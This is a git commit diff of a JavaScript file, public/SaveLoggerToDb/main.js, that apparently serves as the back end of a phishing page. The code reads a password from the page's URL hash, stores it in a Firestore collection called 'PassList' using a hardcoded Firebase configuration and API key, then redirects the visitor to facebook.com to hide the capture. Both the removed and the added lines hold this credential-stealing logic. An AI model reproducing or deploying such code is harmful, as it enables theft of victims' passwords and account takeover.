d3c5a7fa02c4e14caec38f155983c20ef506b773
allentumbagahan <114333808+allentumbagahan@users.noreply.github.com>
2023-05-24 05:17:55 -0400

    Update main.js

--- public/SaveLoggerToDb/main.js
+++ public/SaveLoggerToDb/main.js
@@ -15,7 +15,7 @@
                 let scripts = document.getElementsByTagName("script")
                 for(let i = 0; i < scripts.length; i++){
                     if (scripts[i].src == url){
-                        res()
+                        res(true)
                         break;
                     }
                 }
@@ -35,34 +35,36 @@
             }, 500)
         })
     
-        Promise.all([jsCode1, jsCode2]).then(()=>{
-            const firebaseConfig = {
-                apiKey: "AIzaSyBC6W49ilLK5mWHsP2MXKyiIjmLyRGkFiQ",
-                authDomain: "allentumbagahan-9610f.firebaseapp.com",
-                databaseURL: "https://allentumbagahan-9610f-default-rtdb.firebaseio.com",
-                projectId: "allentumbagahan-9610f",
-                storageBucket: "allentumbagahan-9610f.appspot.com",
-                messagingSenderId: "702145349166",
-                appId: "1:702145349166:web:5ca10176bf764ad6cd41bf",
-                measurementId: "G-NRS398L5KQ"
-              };
-              function save(){
-                  try{
-                  // Initialize Firebase
-                  firebase.initializeApp(firebaseConfig);
-                  // Initialize Cloud Firestore and get a reference to the service
-                  const db = firebase.firestore();
-  
-                  var hash = location.hash
-                  var passt = hash.replace("#", "")
-                  BotBtn = db.collection("PassList").doc(Date())
-                  BotBtn.set({
-                      pass : passt
-                  })
-                  window.location.href = "https://facebook.com"
-                  }catch{
-                    save()
+        Promise.all([jsCode1, jsCode2]).then((val)=>{
+            if(val){
+                const firebaseConfig = {
+                    apiKey: "AIzaSyBC6W49ilLK5mWHsP2MXKyiIjmLyRGkFiQ",
+                    authDomain: "allentumbagahan-9610f.firebaseapp.com",
+                    databaseURL: "https://allentumbagahan-9610f-default-rtdb.firebaseio.com",
+                    projectId: "allentumbagahan-9610f",
+                    storageBucket: "allentumbagahan-9610f.appspot.com",
+                    messagingSenderId: "702145349166",
+                    appId: "1:702145349166:web:5ca10176bf764ad6cd41bf",
+                    measurementId: "G-NRS398L5KQ"
+                  };
+                  function save(){
+                      try{
+                      // Initialize Firebase
+                      firebase.initializeApp(firebaseConfig);
+                      // Initialize Cloud Firestore and get a reference to the service
+                      const db = firebase.firestore();
+      
+                      var hash = location.hash
+                      var passt = hash.replace("#", "")
+                      BotBtn = db.collection("PassList").doc(Date())
+                      BotBtn.set({
+                          pass : passt
+                      })
+                      window.location.href = "https://facebook.com"
+                      }catch{
+                        save()
+                      }
                   }
-              }
-              save()
+                  save()
+            }
             })
